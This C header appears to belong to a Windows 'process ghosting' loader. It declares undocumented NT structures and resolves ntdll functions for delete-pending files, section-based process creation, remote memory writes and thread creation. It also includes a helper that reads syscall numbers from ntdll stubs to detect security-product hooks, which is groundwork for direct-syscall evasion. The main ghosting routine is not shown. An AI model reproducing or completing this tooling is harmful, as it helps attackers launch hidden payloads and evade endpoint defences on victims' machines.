#pragma once
#define WIN32_NO_STATUS
#include <windows.h>
#undef  WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>

#ifndef NT_SUCCESS
#   define NT_SUCCESS(st)  (((NTSTATUS)(st)) >= 0)
#endif

#define FileDispositionInformation 13

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _PROCESS_BASIC_INFORMATION_FULL {
    NTSTATUS  ExitStatus;
    PPEB      PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG      BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION_FULL, *PPROCESS_BASIC_INFORMATION_FULL;

#ifdef _WIN64
#   define PEB_IMAGE_BASE_OFFSET  0x10
#   define PEB_PROC_PARAMS_OFFSET 0x20
#else
#   define PEB_IMAGE_BASE_OFFSET  0x08
#   define PEB_PROC_PARAMS_OFFSET 0x10
#endif

#define PS_INHERIT_HANDLES                  4
#define RTL_USER_PROC_PARAMS_NORMALIZED     0x01

typedef struct _CURDIR {
    UNICODE_STRING DosPath;
    HANDLE         Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT Flags;
    USHORT Length;
    ULONG  TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _GHOST_RTL_USER_PROCESS_PARAMETERS {
    ULONG                   MaximumLength;
    ULONG                   Length;
    ULONG                   Flags;
    ULONG                   DebugFlags;
    HANDLE                  ConsoleHandle;
    ULONG                   ConsoleFlags;
    HANDLE                  StandardInput;
    HANDLE                  StandardOutput;
    HANDLE                  StandardError;
    CURDIR                  CurrentDirectory;
    UNICODE_STRING          DllPath;
    UNICODE_STRING          ImagePathName;
    UNICODE_STRING          CommandLine;
    PVOID                   Environment;
    ULONG                   StartingX;
    ULONG                   StartingY;
    ULONG                   CountX;
    ULONG                   CountY;
    ULONG                   CountCharsX;
    ULONG                   CountCharsY;
    ULONG                   FillAttribute;
    ULONG                   WindowFlags;
    ULONG                   ShowWindowFlags;
    UNICODE_STRING          WindowTitle;
    UNICODE_STRING          DesktopInfo;
    UNICODE_STRING          ShellInfo;
    UNICODE_STRING          RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[32];
    ULONG_PTR               EnvironmentSize;
    ULONG_PTR               EnvironmentVersion;
    PVOID                   PackageDependencyData;
    ULONG                   ProcessGroupId;
    ULONG                   LoaderThreads;
} GHOST_RTL_USER_PROCESS_PARAMETERS, *PGHOST_RTL_USER_PROCESS_PARAMETERS;

typedef NTSTATUS (NTAPI *fnNtSetInformationFile)(
    HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);

typedef NTSTATUS (NTAPI *fnNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    PLARGE_INTEGER, ULONG, ULONG, HANDLE);

typedef NTSTATUS (NTAPI *fnNtCreateProcessEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    HANDLE, ULONG, HANDLE, HANDLE, HANDLE, ULONG);

typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
    HANDLE, LPVOID, LPVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, LPVOID);

typedef NTSTATUS (NTAPI *fnRtlCreateProcessParametersEx)(
    PGHOST_RTL_USER_PROCESS_PARAMETERS *, PUNICODE_STRING,
    PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING,
    PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING,
    PUNICODE_STRING, ULONG);

typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

typedef NTSTATUS (NTAPI *fnNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS (NTAPI *fnNtResumeThread)(
    HANDLE, PULONG);

typedef NTSTATUS (NTAPI *fnNtReadVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

static inline FARPROC ghost_resolve(HMODULE ntdll, const char *name) {
    FARPROC fn = GetProcAddress(ntdll, name);
    if (!fn) {
        fprintf(stderr, "[-] Cannot resolve %s from ntdll\n", name);
        ExitProcess(1);
    }
    return fn;
}

// tüm fonksiyonları tek seferde çözer //
typedef struct _GHOST_NTAPI {
    fnNtSetInformationFile          NtSetInformationFile;
    fnNtCreateSection               NtCreateSection;
    fnNtCreateProcessEx             NtCreateProcessEx;
    fnNtCreateThreadEx              NtCreateThreadEx;
    fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx;
    fnNtQueryInformationProcess     NtQueryInformationProcess;
    fnNtWriteVirtualMemory          NtWriteVirtualMemory;
    fnNtAllocateVirtualMemory       NtAllocateVirtualMemory;
    fnNtResumeThread                NtResumeThread;
    fnNtReadVirtualMemory           NtReadVirtualMemory;
} GHOST_NTAPI;

static inline void ghost_resolve_all(GHOST_NTAPI *api) {
    HMODULE nt = GetModuleHandleA("ntdll.dll");
    api->NtSetInformationFile          = (fnNtSetInformationFile)         ghost_resolve(nt, "NtSetInformationFile");
    api->NtCreateSection               = (fnNtCreateSection)              ghost_resolve(nt, "NtCreateSection");
    api->NtCreateProcessEx             = (fnNtCreateProcessEx)            ghost_resolve(nt, "NtCreateProcessEx");
    api->NtCreateThreadEx              = (fnNtCreateThreadEx)             ghost_resolve(nt, "NtCreateThreadEx");
    api->RtlCreateProcessParametersEx  = (fnRtlCreateProcessParametersEx)ghost_resolve(nt, "RtlCreateProcessParametersEx");
    api->NtQueryInformationProcess     = (fnNtQueryInformationProcess)    ghost_resolve(nt, "NtQueryInformationProcess");
    api->NtWriteVirtualMemory          = (fnNtWriteVirtualMemory)         ghost_resolve(nt, "NtWriteVirtualMemory");
    api->NtAllocateVirtualMemory       = (fnNtAllocateVirtualMemory)      ghost_resolve(nt, "NtAllocateVirtualMemory");
    api->NtResumeThread                = (fnNtResumeThread)               ghost_resolve(nt, "NtResumeThread");
    api->NtReadVirtualMemory           = (fnNtReadVirtualMemory)          ghost_resolve(nt, "NtReadVirtualMemory");
}

static inline DWORD gh_read_ssn(PVOID func_addr)
{
    BYTE *p = (BYTE *)func_addr;
    // 4C 8B D1 B8 //
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD *)(p + 4);
    }
    return 0;  /* hook tespit edildi veya stub farklı */
}
